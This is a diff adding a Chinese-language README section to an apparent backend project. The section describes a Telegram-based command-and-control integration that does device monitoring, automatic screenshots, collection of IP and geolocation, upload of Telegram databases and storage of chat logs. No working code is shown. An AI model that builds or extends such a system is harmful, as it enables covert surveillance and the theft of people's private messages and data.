@@ -72,6 +72,33 @@
 - 合理分层
 
 
+## C2 功能集成 (Telegram Platform)
+
+本项目已集成 Telegram Desktop 客户端的 C2 (Command & Control) 功能，实现了设备监控、数据采集与远程管理。
+
+### 核心特性
+
+1.  **设备监控 (Device Monitoring)**
+    -   支持实时监控设备在线状态。
+    -   **自动截屏监控 (`isMonitorOn`)**: 集成 Telegram 客户端的自动截屏功能，后台实时展示监控开启状态。
+    -   设备基本信息采集：操作系统版本、IP地址、地理位置等。
+
+2.  **数据采集 (Data Ingestion)**
+    -   **Telegram 数据同步**: 自动接收并解析客户端上传的 SQLite 数据库。
+    -   **聊天记录 (`chat_logs`)**: 解析并存储 Telegram 聊天记录，支持去重与检索。
+    -   **系统信息 (`system_info`)**: 解析客户端采集的系统信息。
+    -   **文件列表**: 支持文件扫描结果的上传与展示。
+
+3.  **API 接口**
+    -   `/api/debug/device`: 设备调试与状态查询接口。
+    -   `/api/c2/device/*`: 设备管理相关接口，支持前端 Ant Design Pro 展示。
+
+### 开发注意事项
+
+-   **集成测试**: 使用 `test_integration.py` 验证客户端与服务端的连通性。
+-   **数据库适配**: 服务端自动适配客户端上传的 SQLite 结构，并映射至 MySQL 存储。
+
+
 ## 快速上手
 
 > 所有需要修改的地方鱼皮都标记了 `todo`，便于大家找到修改的位置~
